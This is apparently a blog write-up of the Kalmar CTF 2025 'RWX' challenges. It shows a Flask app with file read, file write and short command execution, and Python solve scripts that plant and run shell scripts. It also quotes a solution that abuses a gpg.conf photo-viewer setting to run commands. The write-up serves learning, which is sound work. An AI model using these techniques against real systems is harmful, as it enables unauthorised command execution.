+++
title = "Kalmar CTF 2025"
date = "2025-04-08"
weight = 0

[taxonomies]
tags=["bash", "bashfu", "ctf"]
ctf=["kalmarctf"]
+++

# RWX - Bronze 

Description:

> We give you file read, file write and code execution. But can you get the flag? Let's start out gently.

> We give you file read, file write and code execution. But can you get the flag? Apparently that was too much!

## Source code & win conditition

Starting of with the *bronze* challenge, we have:


Dockerfile:

```Dockerfile
FROM ubuntu:latest

RUN apt-get update && \
    apt-get install -y python3 python3-pip gcc
RUN pip3 install flask==3.1.0 --break-system-packages

WORKDIR /
COPY flag.txt /
RUN chmod 400 /flag.txt

COPY would.c /
RUN gcc -o would would.c && \
    chmod 6111 would && \
    rm would.c

WORKDIR /app
COPY app.py .

RUN useradd -m user
USER user

CMD ["python3", "app.py"]
```

As seen above `chmod 400 /flag.txt` effectively means that only root can read it. However, there is another file, namely a binary `would`. 

Source code for `would.c`
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    char full_cmd[256] = {0}; 
    for (int i = 1; i < argc; i++) {
        strncat(full_cmd, argv[i], sizeof(full_cmd) - strlen(full_cmd) - 1);
        if (i < argc - 1) strncat(full_cmd, " ", sizeof(full_cmd) - strlen(full_cmd) - 1);
    }

    if (strstr(full_cmd, "you be so kind to provide me with a flag")) {
        FILE *flag = fopen("/flag.txt", "r");
        if (flag) {
            char buffer[1024];
            while (fgets(buffer, sizeof(buffer), flag)) {
                printf("%s", buffer);
            }
            fclose(flag);
            return 0;
        }
    }

    printf("Invalid usage: %s\n", full_cmd);
    return 1;
}
```

Okay, so if we can execute `/would` with the arg `you be so kind to provide me with a flag`, we can read the flag. This is the goal.

So how do we do that?

For the challenge we will be interacting with `app.py`:

```python
from flask import Flask, request, send_file
import subprocess

app = Flask(__name__)

@app.route('/read')
def read():
    filename = request.args.get('filename', '')
    try:
        return send_file(filename)
    except Exception as e:
        return str(e), 400

@app.route('/write', methods=['POST'])
def write():
    filename = request.args.get('filename', '')
    content = request.get_data()
    try:
        with open(filename, 'wb') as f:
            f.write(content)
        return 'OK'
    except Exception as e:
        return str(e), 400

@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 7:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6664)
```

Recapping: 
we can read any file that `user` has permissions to read. We can write any file to directories where `user` has permissions to write. We can also execute commands with no more than $7$ characters.


Since `/would you be so kind to provide me with a flag` is much more than $7$ characters, that is not a viable option. But we can write a file containing that command.
```python
p = """
#!/bin/sh

/would you be so kind to provide me with a flag
"""
```

So where do we write this file, such that we can execute with $7$ or less characters.

We can write it to `/tmp/` as `a`. Then we can execute `sh /*/a` utilizing the wildcard to find the binary `a` in the path `/home/a`, `/opt/a` ... and finally its is found in `/tmp/a`.



I came up with this script.

```python
import requests
import urllib.parse

url = "https://a9<....>08.inst2.chal-kalmarc.tf/"

def exec(param):
    if 7 < len(param):
        print("payload is too long:")
        print(param)
        print(f"len: {len(param)}")

    # encode
    encoded_param = urllib.parse.quote(param)  
    uri = f"{url}/exec?cmd={encoded_param}"
    print(f"{uri=}")
    
    res = requests.get(uri)  
    print("Status Code:", res.status_code)
    print("Response Body:", res.text)
    print()
    return res

def write_file(filename, content):
    params = {"filename": filename}  
    res = requests.post(f"{url}/write", params=params, data=content.encode())

    print("Status Code:", res.status_code)
    print("Response Body:", res.text)

p = """
#!/bin/sh

/would you be so kind to provide me with a flag
"""

write_file("/tmp/a",p)


res = exec("sh /*/a")
```

# RWX - Silver

The challenge is mostly the same, but this time around the `/exec` endpoint only allows $5$ or less characters.


That means that: `"sh /*/a"` has to be shortned by at least $2$ characters.

- We can shorten to the path `/*/a` to `~/a` saving us $1$ character.

But how can we shorten `sh`?

After a some digging i found that I can use `. file`

i.e.:
```text
$ help .
.: . filename [arguments]
    Execute commands from a file in the current shell.

    Read and execute commands from FILENAME in the current shell.  The
    entries in $PATH are used to find the directory containing FILENAME.
    If any ARGUMENTS are supplied, they become the positional parameters
    when FILENAME is executed.

    Exit Status:
    Returns the status of the last command executed in FILENAME; fails if
    FILENAME cannot be read.
```

Thus we can run shorten `sh /*/a` ($7$ chars) to `. ~/a` ($5$ chars)

Updating the script:
```python
import requests
import urllib.parse

url = "https://919<...>496.inst2.chal-kalmarc.tf/"

def exec(param):
    print(f"Executing {param}")
    if 5 < len(param):
        print("Too long:")
        print(param)
        print(f"len: {len(param)}")

    encoded_param = urllib.parse.quote(param)  
    uri = f"{url}exec?cmd={encoded_param}"
    
    res = requests.get(uri)  
    print("Status Code:", res.status_code)
    print(f"Response Body:\n{res.text}\n--- res end ---")
    print()
    return res

def write_file(filename, content):
    print(f"Writing file; path=\"{filename}\"")
    params = {"filename": filename}  
    res = requests.post(f"{url}/write", params=params, data=content.encode())

    print("Status Code:", res.status_code)
    print("Response Body:\n\n--- res end ---", res.text)

p = """
#!/bin/sh

/would you be so kind to provide me with a flag
"""
write_file("/home/user/a",p)

# exec("sh ~/*") # too long
exec(". ~/a")
```

# Gold...

I was close to solving this. 

I tried all binaries of with size $3$ or less. I tried `pip` and others but found no vector. Lastly I went with `gpg`, but I could find a way for it to execute my file or any other method of executing the `would` binary

After the fact I found this japanese writeup:

[nanimokangaeteinai.hateblo.jp - RWX Gold](https://nanimokangaeteinai.hateblo.jp/entry/2025/03/10/041721#Misc-393-RWX---Gold-12-solves)

```python
import httpx
with httpx.Client(base_url='https://(省略)') as client:
    client.get('/exec?cmd=gpg')
    # client.post('/write?filename=/home/user/.gnupg/trustdb.gpg', data=open('trustdb.gpg','rb').read()) # 改めて検証したところ必要なかったので削除@2025-03-11
    client.post('/write?filename=/home/user/.gnupg/pubring.kbx', data=open('pubring.kbx','rb').read())
    client.post('/write?filename=/home/user/.gnupg/gpg.conf', data='''
list-keys
list-options show-photos
photo-viewer "/would 'you be so kind to provide me with a flag' > /tmp/nekochan"
'''.strip())
    client.get('/exec?cmd=gpg')
    r = client.get('/read?filename=/tmp/nekochan')
    print(r.text)
```
